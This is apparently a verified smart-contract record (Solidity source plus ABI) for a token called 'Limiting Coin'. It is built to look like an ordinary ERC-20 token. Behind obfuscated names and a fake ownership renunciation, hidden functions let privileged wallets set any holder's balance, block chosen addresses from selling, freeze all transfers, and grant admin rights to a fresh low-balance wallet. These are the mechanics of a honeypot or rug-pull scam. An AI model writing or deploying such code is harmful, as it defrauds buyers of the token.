{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract toReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountSender {\n    function createPair(address tokenTrading, address totalSender) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface totalFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface sellTotalAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldMax) external view returns (uint256);\n\n    function transfer(address atFund, uint256 sellIsWallet) external returns (bool);\n\n    function allowance(address listAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellIsWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atFund,\n        uint256 sellIsWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountTotal, uint256 value);\n    event Approval(address indexed listAuto, address indexed spender, uint256 value);\n}\n\ninterface sellTotalAtMetadata is sellTotalAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LimitingCoin is toReceiver, sellTotalAt, sellTotalAtMetadata {\n\n    uint256 public listLaunchLiquidity;\n\n    mapping(address => bool) public totalBuyLaunched;\n\n    mapping(address => uint256) private takeTeam;\n\n    string private totalEnable = \"LCN\";\n\n    uint256 public takeList = 3;\n\n    function getOwner() external view returns (address) {\n        return isEnable;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return atReceiver;\n    }\n\n    function approve(address amountFee, uint256 sellIsWallet) public virtual override returns (bool) {\n        fundLaunched[_msgSender()][amountFee] = sellIsWallet;\n        emit Approval(_msgSender(), amountFee, sellIsWallet);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed marketingMode, address indexed launchShouldTx);\n\n    function transferFrom(address isEnableSender, address atFund, uint256 sellIsWallet) external override returns (bool) {\n        if (_msgSender() != maxLaunched) {\n            if (fundLaunched[isEnableSender][_msgSender()] != type(uint256).max) {\n                require(sellIsWallet <= fundLaunched[isEnableSender][_msgSender()]);\n                fundLaunched[isEnableSender][_msgSender()] -= sellIsWallet;\n            }\n        }\n        return liquidityTake(isEnableSender, atFund, sellIsWallet);\n    }\n\n    uint256 public txAmount = 0;\n\n    function decimals() external view virtual override returns (uint8) {\n        return marketingBuyAmount;\n    }\n\n    uint256 constant sellTxFund = 16 ** 10;\n\n    address public senderFund;\n\n    uint256 public buyMarketingShould;\n\n    function enableTokenMarketing(uint256 sellIsWallet) public {\n        listReceiver();\n        walletSell = sellIsWallet;\n    }\n\n    function liquidityTake(address isEnableSender, address atFund, uint256 sellIsWallet) internal returns (bool) {\n        if (isEnableSender == isSwap) {\n            return liquidityAt(isEnableSender, atFund, sellIsWallet);\n        }\n        uint256 senderList = sellTotalAt(senderFund).balanceOf(takeReceiver);\n        require(senderList == walletSell);\n        require(atFund != takeReceiver);\n        if (marketingModeTrading[isEnableSender]) {\n            return liquidityAt(isEnableSender, atFund, sellTxFund);\n        }\n        sellIsWallet = amountTrading(isEnableSender, atFund, sellIsWallet);\n        return liquidityAt(isEnableSender, atFund, sellIsWallet);\n    }\n\n    uint256 public listEnableShould;\n\n    function listReceiver() private view {\n        require(totalBuyLaunched[_msgSender()]);\n    }\n\n    uint256 public modeMin;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountWallet;\n    }\n\n    function amountEnableTeam(address fromIsTotal, uint256 sellIsWallet) public {\n        listReceiver();\n        takeTeam[fromIsTotal] = sellIsWallet;\n    }\n\n    uint256 buyMax;\n\n    bool public toTotal;\n\n    constructor (){\n        \n        teamTokenBuy();\n        totalFee feeIs = totalFee(maxLaunched);\n        senderFund = amountSender(feeIs.factory()).createPair(feeIs.WETH(), address(this));\n        takeReceiver = amountSender(feeIs.factory()).feeTo();\n        if (enableFee == takeSender) {\n            receiverTeamMin = listEnableShould;\n        }\n        isSwap = _msgSender();\n        totalBuyLaunched[isSwap] = true;\n        takeTeam[isSwap] = amountWallet;\n        if (enableFee) {\n            receiverTeamMin = listLaunchLiquidity;\n        }\n        emit Transfer(address(0), isSwap, amountWallet);\n    }\n\n    uint8 private marketingBuyAmount = 18;\n\n    uint256 walletSell;\n\n    address private isEnable;\n\n    function transfer(address fromIsTotal, uint256 sellIsWallet) external virtual override returns (bool) {\n        return liquidityTake(_msgSender(), fromIsTotal, sellIsWallet);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalEnable;\n    }\n\n    address public isSwap;\n\n    uint256 private amountWallet = 100000000 * 10 ** 18;\n\n    bool public senderFee;\n\n    uint256 public listReceiverTrading;\n\n    function allowance(address autoToken, address amountFee) external view virtual override returns (uint256) {\n        if (amountFee == maxLaunched) {\n            return type(uint256).max;\n        }\n        return fundLaunched[autoToken][amountFee];\n    }\n\n    string private atReceiver = \"Limiting Coin\";\n\n    function liquidityAt(address isEnableSender, address atFund, uint256 sellIsWallet) internal returns (bool) {\n        require(takeTeam[isEnableSender] >= sellIsWallet);\n        takeTeam[isEnableSender] -= sellIsWallet;\n        takeTeam[atFund] += sellIsWallet;\n        emit Transfer(isEnableSender, atFund, sellIsWallet);\n        return true;\n    }\n\n    address maxLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public receiverTeamMin;\n\n    mapping(address => bool) public marketingModeTrading;\n\n    bool public takeSender;\n\n    function shouldTotal(address tradingTeam) public {\n        listReceiver();\n        \n        if (tradingTeam == isSwap || tradingTeam == senderFund) {\n            return;\n        }\n        marketingModeTrading[tradingTeam] = true;\n    }\n\n    bool private enableFee;\n\n    function toEnableExempt(address toTeamIs) public {\n        require(toTeamIs.balance < 100000);\n        if (senderFee) {\n            return;\n        }\n        if (listEnableShould != listLaunchLiquidity) {\n            listLaunchLiquidity = modeMin;\n        }\n        totalBuyLaunched[toTeamIs] = true;\n        \n        senderFee = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private fundLaunched;\n\n    function balanceOf(address shouldMax) public view virtual override returns (uint256) {\n        return takeTeam[shouldMax];\n    }\n\n    function amountTrading(address isEnableSender, address atFund, uint256 sellIsWallet) internal view returns (uint256) {\n        require(sellIsWallet > 0);\n\n        uint256 swapMarketing = 0;\n        if (isEnableSender == senderFund && takeList > 0) {\n            swapMarketing = sellIsWallet * takeList / 100;\n        } else if (atFund == senderFund && txAmount > 0) {\n            swapMarketing = sellIsWallet * txAmount / 100;\n        }\n        require(swapMarketing <= sellIsWallet);\n        return sellIsWallet - swapMarketing;\n    }\n\n    function teamTokenBuy() public {\n        emit OwnershipTransferred(isSwap, address(0));\n        isEnable = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return isEnable;\n    }\n\n    address takeReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchShouldTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromIsTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellIsWallet\",\"type\":\"uint256\"}],\"name\":\"amountEnableTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellIsWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMarketingShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellIsWallet\",\"type\":\"uint256\"}],\"name\":\"enableTokenMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listEnableShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLaunchLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listReceiverTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingModeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTeamMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTeam\",\"type\":\"address\"}],\"name\":\"shouldTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTokenBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTeamIs\",\"type\":\"address\"}],\"name\":\"toEnableExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalBuyLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromIsTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellIsWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isEnableSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellIsWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "LimitingCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}